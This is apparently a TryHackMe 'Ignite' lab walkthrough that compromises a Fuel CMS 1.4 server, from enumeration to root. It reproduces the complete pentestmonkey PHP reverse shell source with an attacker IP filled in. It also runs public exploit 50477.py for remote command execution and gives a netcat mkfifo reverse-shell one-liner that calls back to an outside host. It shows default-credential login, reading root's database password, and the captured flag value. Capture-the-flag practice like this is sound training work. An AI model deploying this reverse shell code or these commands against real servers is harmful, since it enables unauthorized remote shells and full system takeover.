#   Tryhackme - Ignite
##  IP = 10.10.66.191
##  Walkthrough by
```
Shaswata Saha
11-07-23
12:52PM
```

##  Steps:
1.  nmap scan

2.  Gobuster scan
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.66.191 -w Documents/gobuster-wordlist/dsstorewordlist.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.66.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/11 03:49:28 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.66.191/assets/]
/robots.txt           (Status: 200) [Size: 30]
/index.php            (Status: 200) [Size: 16595]
/.htaccess            (Status: 403) [Size: 296]
/composer.json        (Status: 200) [Size: 193]
/README.md            (Status: 200) [Size: 1427]
/home                 (Status: 200) [Size: 16595]
/contributing.md      (Status: 200) [Size: 6502]
Progress: 466 / 1829 (25.48%)[ERROR] 2023/07/11 03:50:19 [!] Get "http://10.10.66.191/forums": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/index                (Status: 200) [Size: 16595]
/.htpasswd            (Status: 403) [Size: 296]
/.htpasswds           (Status: 403) [Size: 297]
/lost+found           (Status: 400) [Size: 1134]
Progress: 1828 / 1829 (99.95%)
===============================================================
2023/07/11 03:52:28 Finished
===============================================================


```
3.  We login to the fuel cms using login as --> admin:admin

4.  We tried to reverse shell :


```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.17.28.202';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 


```

But no upload was successful.

5.  We went to the searchsploit and searched for Fuel CMS 1.4
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ searchsploit fuel CMS 1.4 
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path     | windows/local/49535.txt
Franklin Fueling Systems Colibri Controller Module 1.8.19. | linux/remote/50861.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerab | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                 | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                 | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                 | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)       | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenti | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)         | php/webapps/50884.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

6.  Here we want the 50477.py file which supports latest Fuel 

7.  We run the file on our network and got the connection..!
```bash
──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Ignite]
└─$ python3 50477.py -u http://10.10.66.191 
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

Enter Command $cd /home
system

Enter Command $pwd
system/var/www/html


Enter Command $whoami
systemwww-data


Enter Command $ls /home/www-data
systemflag.txt


Enter Command $ls /home
systemwww-data

Enter Command $cat /home/www-data/systemflag.txt
system

Enter Command $cat /home/www-data/flag.txt      
system6470e394cbf6dab6a91682cc8585059b 

```

8.  To get the reverse shell we paste the command to the terminal opened:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.28.202 1234 >/tmp/f
```

Before that set a netcat reverse shell listener:
```bash
nc -lnvp 1234
```

9.  ![database access](https://raw.githubusercontent.com/jordansinclair1990/TryHackMeIgnite/main/screenshots/databaseaccess.png)

So I **cd**'d into the **/var/www/html/fuel/application/config** directory. Then I looked at the **database.php** file (I'm only showing the relevant section):

```php
<
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

```
10. It lists root's password as **"mememe"**

I then tried the **su root** command with this password, and it worked! I am now root!

I looked in the **/root** directory, and fount the **root.txt** file:

Hacked the root..!